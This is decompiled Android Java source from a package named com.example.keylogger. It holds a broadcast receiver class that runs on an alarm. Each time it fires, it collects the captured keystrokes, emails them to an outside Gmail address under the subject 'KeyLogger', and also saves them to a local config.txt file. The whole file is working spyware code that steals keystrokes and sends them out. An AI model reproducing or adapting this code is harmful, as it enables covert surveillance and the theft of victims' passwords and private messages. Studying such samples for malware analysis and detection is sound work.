package com.example.keylogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.IOException;
import java.io.OutputStreamWriter;

/* loaded from: classes9.dex */
public class BroadcastForAlarm extends BroadcastReceiver {
    KeyLogs log = new KeyLogs();

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String msg = KeyLogs.GetLog();
        SendEmail SendEmail = new SendEmail(context, "APThreat@gmail.com", "KeyLogger", msg);
        SendEmail.Send();
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.txt", 0));
            outputStreamWriter.write(msg);
            outputStreamWriter.close();
        } catch (IOException e10) {
            Log.e("Exception", "File write failed: " + e10.toString());
        }
    }
}